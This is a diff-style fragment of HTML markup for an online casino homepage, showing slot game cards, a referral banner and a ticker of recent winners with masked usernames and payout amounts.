+                      <div aria-label="Money Coming" role="img"
+                        class="v-image v-responsive banner-img d-flex justify-center align-center theme--light">
+                        <div class="v-responsive__content"><img
+                            src="https://jiliwin.9terawolf.com/images/krikya/game_icons/en/custom/51_0.jpg"
+                            class="homepageHot_img"><!----><img src="https://gamius88.github.io/page/hot-icon.png"
+                            class="img-hot-home pos_right_top"></div>
+                      </div><span class="smallTextGameLocale">Money Coming</span>
+                    </div>
+                    <div class="game-card-box-item d-flex gT_homepageHot">
+                      <div aria-label="Aviator" role="img"
+                        class="v-image v-responsive banner-img d-flex justify-center align-center theme--light">
+                        <div class="v-responsive__content">
+                          <img src="https://jiliwin.9terawolf.com/cms/h8/image/64e6c8d33a982.png"
+                            class="homepageHot_img"><!---->
+                          <img src="https://gamius88.github.io/page/hot-icon.png" class="img-hot-home pos_right_top">
+                        </div>
+                      </div><span class="smallTextGameLocale">Aviator</span>
+                    </div>
+                  </div>
+                </div>
+                <div class="row no-gutters">
+                  <div class="col col-12">
+                    <button type="button"
+                      class="viewBtn v-btn v-btn--is-elevated v-btn--has-bg theme--light v-size--default"><span
+                        class="v-btn__content">
+                        View More
+                        <i aria-hidden="true"
+                          class="v-icon notranslate mdi mdi-chevron-down theme--light"></i></span></button>
+                  </div>
+                </div>
+              </div>
+            </div>
+            <div class="highlight-container referral-home-banner-height px-4">
+              <div class="highlight-wrapper pt-4">
+                <div class="third-row-container">
+                  <div>Referral Program</div>
+                </div>
+                <div>
+                  <div class="matches-box first_box_match" style="overflow-x: hidden;">
+                    <a href="/page" class="" style="cursor: pointer;">
+                      <img alt="referral"
+                        src="https://jiliwin.9terawolf.com/images/krikya/referral/en/refer_mobile.webp"
+                        class="referral_img"></a>
+                  </div><!---->
+                </div>
+              </div>
+            </div>
+            <div class="pb-2 px-4 pt-2">
+              <div>
+                <div class="row no-gutters align-center justify-start" style="width: 100%; max-width: 100%;">
+                  <div class="pa-0 justify-start d-flex col col-12">
+                    Live Betting: Real Time Winners Happening Right Now
+                  </div>
+                </div>
+                <div class="row no-gutters" style="overflow-x: auto; display: flex; flex-wrap: nowrap;">
+                  <div class="pa-0 justify-start d-flex scroll-row col col-12"><button type="button"
+                      class="ma-2 v-btn v-btn--is-elevated v-btn--has-bg theme--light v-size--large selectedTab"><span
+                        class="v-btn__content">
+                        Slots
+                      </span></button><button type="button"
+                      class="ma-2 v-btn v-btn--is-elevated v-btn--has-bg theme--light v-size--large normalTab"><span
+                        class="v-btn__content">
+                        Casino
+                      </span></button><button type="button"
+                      class="ma-2 v-btn v-btn--is-elevated v-btn--has-bg theme--light v-size--large normalTab"><span
+                        class="v-btn__content">
+                        Crash
+                      </span></button><button type="button"
+                      class="ma-2 v-btn v-btn--is-elevated v-btn--has-bg theme--light v-size--large normalTab"><span
+                        class="v-btn__content">
+                        Table
+                      </span></button></div>
+                </div>
+                <div class="scrolling-text">
+                  <div class="row no-gutters">
+                    <div style="overflow: auto hidden; display: flex; flex-wrap: nowrap; width: 100%;">
+                      <div class="row scroll-row pt-2 pb-2 no-gutters align-center justify-start">
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-image__image v-image__image--preload v-image__image--cover"
+                                  style="background-position: center center;"></div>
+                                <div class="v-responsive__content"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Super Ace</div>
+                              <div class="row highPayoutTextSmall no-gutters">to*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:52:48</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                7482.50
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-image__image v-image__image--preload v-image__image--cover"
+                                  style="background-position: center center;"></div>
+                                <div class="v-responsive__content"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Super Ace</div>
+                              <div class="row highPayoutTextSmall no-gutters">raz*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:52:42</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                3270.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-responsive__sizer" style="padding-bottom: 68.6275%;"></div>
+                                <div class="v-image__image v-image__image--cover"
+                                  style="background-image: url('https://jiliwin.9terawolf.com/images/krikya/game_icons/en/custom/223_0.jpg'); background-position: center center;">
+                                </div>
+                                <div class="v-responsive__content" style="width: 255px;"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Fortune Gems 2...
+                              </div>
+                              <div class="row highPayoutTextSmall no-gutters">rai*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:52:30</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                3450.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-responsive__sizer" style="padding-bottom: 68.6275%;"></div>
+                                <div class="v-image__image v-image__image--cover"
+                                  style="background-image: url('https://jiliwin.9terawolf.com/images/krikya/game_icons/en/custom/103_0.jpg'); background-position: center center;">
+                                </div>
+                                <div class="v-responsive__content" style="width: 255px;"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Golden Empire
+                              </div>
+                              <div class="row highPayoutTextSmall no-gutters">nazmu*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:52:29</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                2770.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-responsive__sizer" style="padding-bottom: 68.6275%;"></div>
+                                <div class="v-image__image v-image__image--cover"
+                                  style="background-image: url('https://jiliwin.9terawolf.com/images/krikya/game_icons/en/custom/49_0.jpg'); background-position: center center;">
+                                </div>
+                                <div class="v-responsive__content" style="width: 255px;"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Super Ace</div>
+                              <div class="row highPayoutTextSmall no-gutters">khanra*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:52:27</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                4480.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-responsive__sizer" style="padding-bottom: 68.6275%;"></div>
+                                <div class="v-image__image v-image__image--cover"
+                                  style="background-image: url('https://jiliwin.9terawolf.com/images/krikya/game_icons/en/custom/51_0.jpg'); background-position: center center;">
+                                </div>
+                                <div class="v-responsive__content" style="width: 255px;"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Money Coming
+                              </div>
+                              <div class="row highPayoutTextSmall no-gutters">shami*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:52:19</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                4905.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-responsive__sizer" style="padding-bottom: 68.6275%;"></div>
+                                <div class="v-image__image v-image__image--cover"
+                                  style="background-image: url('https://jiliwin.9terawolf.com/cms/h8/image/67c80bfe086a6.png'); background-position: center center;">
+                                </div>
+                                <div class="v-responsive__content" style="width: 255px;"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Super Ace
+                                Joker...
+                              </div>
+                              <div class="row highPayoutTextSmall no-gutters">motal*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:52:11</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                3411.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-responsive__sizer" style="padding-bottom: 68.6275%;"></div>
+                                <div class="v-image__image v-image__image--cover"
+                                  style="background-image: url('https://jiliwin.9terawolf.com/images/krikya/game_icons/en/custom/49_0.jpg'); background-position: center center;">
+                                </div>
+                                <div class="v-responsive__content" style="width: 255px;"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Super Ace</div>
+                              <div class="row highPayoutTextSmall no-gutters">r*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:52:08</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                2040.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-responsive__sizer" style="padding-bottom: 68.6275%;"></div>
+                                <div class="v-image__image v-image__image--cover"
+                                  style="background-image: url('https://jiliwin.9terawolf.com/images/krikya/game_icons/en/custom/49_0.jpg'); background-position: center center;">
+                                </div>
+                                <div class="v-responsive__content" style="width: 255px;"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Super Ace</div>
+                              <div class="row highPayoutTextSmall no-gutters">i*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:51:31</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                2525.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-responsive__sizer" style="padding-bottom: 68.6275%;"></div>
+                                <div class="v-image__image v-image__image--cover"
+                                  style="background-image: url('https://jiliwin.9terawolf.com/images/krikya/game_icons/en/custom/49_0.jpg'); background-position: center center;">
+                                </div>
+                                <div class="v-responsive__content" style="width: 255px;"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Super Ace</div>
+                              <div class="row highPayoutTextSmall no-gutters">to*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:51:18</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                2010.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-responsive__sizer" style="padding-bottom: 68.6275%;"></div>
+                                <div class="v-image__image v-image__image--cover"
+                                  style="background-image: url('https://jiliwin.9terawolf.com/images/krikya/game_icons/en/custom/302_0.jpg'); background-position: center center;">
+                                </div>
+                                <div class="v-responsive__content" style="width: 255px;"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Money Coming
+                                Expand...</div>
+                              <div class="row highPayoutTextSmall no-gutters">kur*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:51:10</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                2066.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-responsive__sizer" style="padding-bottom: 68.6275%;"></div>
+                                <div class="v-image__image v-image__image--cover"
+                                  style="background-image: url('https://jiliwin.9terawolf.com/images/krikya/game_icons/en/custom/35_0.jpg'); background-position: center center;">
+                                </div>
+                                <div class="v-responsive__content" style="width: 255px;"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Crazy777</div>
+                              <div class="row highPayoutTextSmall no-gutters">sab*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:50:59</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                3210.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-responsive__sizer" style="padding-bottom: 100%;"></div>
+                                <div class="v-image__image v-image__image--cover"
+                                  style="background-image: url('https://jiliwin.9terawolf.com/cms/h8/image/67eca765bfdaf.png'); background-position: center center;">
+                                </div>
+                                <div class="v-responsive__content" style="width: 400px;"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">3 Charge
+                                Buffalo...
+                              </div>
+                              <div class="row highPayoutTextSmall no-gutters">rami*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:50:50</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                12372.80
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-responsive__sizer" style="padding-bottom: 68.6275%;"></div>
+                                <div class="v-image__image v-image__image--cover"
+                                  style="background-image: url('https://jiliwin.9terawolf.com/images/krikya/game_icons/en/custom/300_0.jpg'); background-position: center center;">
+                                </div>
+                                <div class="v-responsive__content" style="width: 255px;"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Fortune Gems 3...
+                              </div>
+                              <div class="row highPayoutTextSmall no-gutters">ra*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:50:42</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                4650.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-responsive__sizer" style="padding-bottom: 68.6275%;"></div>
+                                <div class="v-image__image v-image__image--cover"
+                                  style="background-image: url('https://jiliwin.9terawolf.com/images/krikya/game_icons/en/custom/51_0.jpg'); background-position: center center;">
+                                </div>
+                                <div class="v-responsive__content" style="width: 255px;"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Money Coming
+                              </div>
+                              <div class="row highPayoutTextSmall no-gutters">asifu*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:50:39</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                2900.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-responsive__sizer" style="padding-bottom: 68.6275%;"></div>
+                                <div class="v-image__image v-image__image--cover"
+                                  style="background-image: url('https://jiliwin.9terawolf.com/images/krikya/game_icons/en/custom/103_0.jpg'); background-position: center center;">
+                                </div>
+                                <div class="v-responsive__content" style="width: 255px;"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Golden Empire
+                              </div>
+                              <div class="row highPayoutTextSmall no-gutters">nazmu*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:49:40</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                2150.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-responsive__sizer" style="padding-bottom: 66.6667%;"></div>
+                                <div class="v-image__image v-image__image--cover"
+                                  style="background-image: url('https://luckmedia.link/pgs_wild_bounty_showdown/thumb.webp'); background-position: center center;">
+                                </div>
+                                <div class="v-responsive__content" style="width: 450px;"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Wild Bounty
+                                Showdown...</div>
+                              <div class="row highPayoutTextSmall no-gutters">no*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:49:27</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                2252.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-responsive__sizer" style="padding-bottom: 68.6275%;"></div>
+                                <div class="v-image__image v-image__image--cover"
+                                  style="background-image: url('https://jiliwin.9terawolf.com/images/krikya/game_icons/en/custom/49_0.jpg'); background-position: center center;">
+                                </div>
+                                <div class="v-responsive__content" style="width: 255px;"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Super Ace</div>
+                              <div class="row highPayoutTextSmall no-gutters">raz*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:49:21</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                6120.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-responsive__sizer" style="padding-bottom: 68.6275%;"></div>
+                                <div class="v-image__image v-image__image--cover"
+                                  style="background-image: url('https://jiliwin.9terawolf.com/images/krikya/game_icons/en/custom/49_0.jpg'); background-position: center center;">
+                                </div>
+                                <div class="v-responsive__content" style="width: 255px;"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Super Ace</div>
+                              <div class="row highPayoutTextSmall no-gutters">013114*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:48:49</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                6240.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-image__image v-image__image--preload v-image__image--cover"
+                                  style="background-position: center center;"></div>
+                                <div class="v-responsive__content"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Money Coming
+                              </div>
+                              <div class="row highPayoutTextSmall no-gutters">khajam*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:48:43</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                2450.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-responsive__sizer" style="padding-bottom: 68.6275%;"></div>
+                                <div class="v-image__image v-image__image--cover"
+                                  style="background-image: url('https://jiliwin.9terawolf.com/images/krikya/game_icons/en/custom/49_0.jpg'); background-position: center center;">
+                                </div>
+                                <div class="v-responsive__content" style="width: 255px;"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Super Ace</div>
+                              <div class="row highPayoutTextSmall no-gutters">kamru*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:48:32</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                2922.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-responsive__sizer" style="padding-bottom: 66.6667%;"></div>
+                                <div class="v-image__image v-image__image--cover"
+                                  style="background-image: url('https://luckmedia.link/pgs_wild_bandito/thumb.webp'); background-position: center center;">
+                                </div>
+                                <div class="v-responsive__content" style="width: 450px;"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Wild Bandito
+                              </div>
+                              <div class="row highPayoutTextSmall no-gutters">mintu*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:48:25</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                2743.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-responsive__sizer" style="padding-bottom: 66.6667%;"></div>
+                                <div class="v-image__image v-image__image--cover"
+                                  style="background-image: url('https://luckmedia.link/pgs_chocolate_deluxe/thumb.webp'); background-position: center center;">
+                                </div>
+                                <div class="v-responsive__content" style="width: 450px;"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Chocolate Deluxe
+                              </div>
+                              <div class="row highPayoutTextSmall no-gutters">shar*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:48:24</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                2126.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-responsive__sizer" style="padding-bottom: 66.6667%;"></div>
+                                <div class="v-image__image v-image__image--cover"
+                                  style="background-image: url('https://luckmedia.link/pgs_wild_bounty_showdown/thumb.webp'); background-position: center center;">
+                                </div>
+                                <div class="v-responsive__content" style="width: 450px;"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Wild Bounty
+                                Showdown...</div>
+                              <div class="row highPayoutTextSmall no-gutters">tohr*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:48:12</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                2640.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-responsive__sizer" style="padding-bottom: 68.6275%;"></div>
+                                <div class="v-image__image v-image__image--cover"
+                                  style="background-image: url('https://jiliwin.9terawolf.com/images/krikya/game_icons/en/custom/51_0.jpg'); background-position: center center;">
+                                </div>
+                                <div class="v-responsive__content" style="width: 255px;"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Money Coming
+                              </div>
+                              <div class="row highPayoutTextSmall no-gutters">a*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:48:09</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
